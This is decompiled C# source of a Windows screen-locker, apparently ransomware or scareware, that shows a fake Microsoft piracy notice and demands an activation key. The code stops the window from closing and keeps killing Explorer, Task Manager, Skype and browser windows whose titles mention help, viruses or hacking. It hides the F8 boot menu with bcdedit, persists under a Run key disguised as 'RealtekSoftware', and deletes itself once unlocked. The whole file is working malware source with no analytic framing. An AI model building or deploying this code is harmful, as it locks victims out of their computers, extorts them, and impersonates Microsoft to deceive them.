using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Srv_Lock.My;

namespace Srv_Lock;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel _LinkLabel1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("param1")]
	private TextBox _param1;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	private string[] Settings;

	private string selfText;

	private string email;

	private string password;

	private string useSecure;

	private byte[] self;

	public string SL;

	public string UC;

	internal virtual PictureBox PictureBox1
	{
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(LinkLabel1_LinkClicked);
			if (_LinkLabel1 != null)
			{
				_LinkLabel1.remove_LinkClicked(val);
			}
			_LinkLabel1 = value;
			if (_LinkLabel1 != null)
			{
				_LinkLabel1.add_LinkClicked(val);
			}
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox param1
	{
		get
		{
			return _param1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_param1 = value;
		}
	}

	internal virtual Label Label5
	{
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Closing((CancelEventHandler)Form1_Closing);
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected O, but got Unknown
		//IL_0344: Unknown result type (might be due to invalid IL or missing references)
		//IL_034e: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Label1 = new Label();
		Label2 = new Label();
		LinkLabel1 = new LinkLabel();
		Button1 = new Button();
		param1 = new TextBox();
		Label5 = new Label();
		PictureBox1 = new PictureBox();
		Timer1 = new Timer(components);
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.FromArgb(192, 0, 0));
		Label label = Label1;
		Point location = new Point(2, 2);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		Size size = new Size(537, 30);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("This copy of Windows has been flagged as pirated");
		Label1.set_TextAlign((ContentAlignment)2);
		Label label3 = Label2;
		location = new Point(146, 35);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(393, 143);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(2);
		Label2.set_Text(componentResourceManager.GetString("Label2.Text"));
		((Control)LinkLabel1).set_BackColor(Color.Transparent);
		LinkLabel linkLabel = LinkLabel1;
		location = new Point(380, 87);
		((Control)linkLabel).set_Location(location);
		((Control)LinkLabel1).set_Name("LinkLabel1");
		LinkLabel linkLabel2 = LinkLabel1;
		size = new Size(52, 17);
		((Control)linkLabel2).set_Size(size);
		((Control)LinkLabel1).set_TabIndex(3);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("HERE.");
		Button button = Button1;
		location = new Point(442, 197);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(90, 22);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(4);
		((ButtonBase)Button1).set_Text("Submit Key");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		TextBox obj = param1;
		location = new Point(95, 198);
		((Control)obj).set_Location(location);
		((Control)param1).set_Name("param1");
		TextBox obj2 = param1;
		size = new Size(341, 20);
		((Control)obj2).set_Size(size);
		((Control)param1).set_TabIndex(6);
		Label5.set_AutoSize(true);
		Label label5 = Label5;
		location = new Point(12, 201);
		((Control)label5).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label6 = Label5;
		size = new Size(77, 13);
		((Control)label6).set_Size(size);
		((Control)Label5).set_TabIndex(10);
		Label5.set_Text("Activation key:");
		PictureBox1.set_Image((Image)componentResourceManager.GetObject("PictureBox1.Image"));
		PictureBox pictureBox = PictureBox1;
		location = new Point(12, 35);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(130, 130);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		Timer1.set_Enabled(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.DodgerBlue);
		size = new Size(544, 231);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)param1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Form1");
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form1_Closing(object sender, CancelEventArgs e)
	{
		e.Cancel = true;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		self = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllBytes(Application.get_ExecutablePath());
		selfText = Encoding.Default.GetString(self);
		Settings = Strings.Split(selfText, "|sabre|", -1, (CompareMethod)0);
		SL = Settings[1];
		UC = Settings[2];
		checkme();
		ShowDesktop();
		disableF8();
		starting();
		Process[] processesByName = Process.GetProcessesByName(defaultbrowser());
		try
		{
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string defaultbrowser()
	{
		string text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_CLASSES_ROOT\\HTTP\\shell\\open\\command", "", (object)"Not Found"));
		string[] array = Strings.Split(text, "\"", -1, (CompareMethod)0);
		return Path.GetFileNameWithoutExtension(array[1]);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(param1.get_Text(), UC, false) == 0)
		{
			Interaction.MsgBox((object)"Your activation key has successfully authenticated Windows. Your PC will return to normal after this message.\r\n\r\n-The Microsoft Team", (MsgBoxStyle)Conversions.ToInteger("Windows Authentication Module"), (object)(MsgBoxStyle)64);
			Timer1.set_Enabled(false);
			enableF8();
			Process.Start("explorer");
			nostarting();
			autdestroy();
			ProjectData.EndApp();
		}
		else
		{
			Interaction.MsgBox((object)"That activation key is invalid. Ensure you have entered it correctly.", (MsgBoxStyle)Conversions.ToInteger("Windows Authentication Module"), (object)(MsgBoxStyle)16);
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		Process[] processesByName = Process.GetProcessesByName("explorer");
		Process[] processesByName2 = Process.GetProcessesByName("taskmgr");
		Process[] processesByName3 = Process.GetProcessesByName("Skype");
		try
		{
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] array2 = processesByName2;
			foreach (Process process2 in array2)
			{
				process2.Kill();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] array3 = processesByName3;
			foreach (Process process3 in array3)
			{
				process3.Kill();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName4 = Process.GetProcessesByName(defaultbrowser());
			foreach (Process process4 in processesByName4)
			{
				string text = process4.MainWindowTitle.ToString().ToLower();
				if (text.Contains("facebook") | text.Contains("youtube") | text.Contains("virus") | text.Contains("infected") | text.Contains("search") | text.Contains("windows") | text.Contains("bing") | text.Contains("nuova scheda") | text.Contains("new tab") | text.Contains("cerca") | text.Contains("hacked") | text.Contains("help me"))
				{
					process4.Kill();
					((Control)this).Focus();
					Interaction.MsgBox((object)"Internet usage is suspended until Windows is activated. Enter the activation key to continue using your PC as normal.", (MsgBoxStyle)16, (object)null);
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start(SL);
	}

	public void ShowDesktop()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("shell.application", ""));
		NewLateBinding.LateCall(objectValue, (Type)null, "MinimizeAll", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		objectValue = null;
	}

	public void disableF8()
	{
		try
		{
			Interaction.Shell("bcdedit /set {bootmgr} displaybootmenu no", (AppWinStyle)2, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void enableF8()
	{
		try
		{
			Interaction.Shell("bcdedit /set {bootmgr} displaybootmenu yes", (AppWinStyle)2, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void starting()
	{
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("RealtekSoftware", Application.get_ExecutablePath());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void nostarting()
	{
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")!.DeleteValue("RealtekSoftware", Conversions.ToBoolean(Application.get_ExecutablePath()));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void checkme()
	{
		if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length > 1)
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void autdestroy()
	{
		Process.Start("cmd.exe", "/C ping 1.1.1.1 -n 2 -w 3000 > Nul & Del \"" + Application.get_ExecutablePath() + "\"");
		ProjectData.EndApp();
	}
}
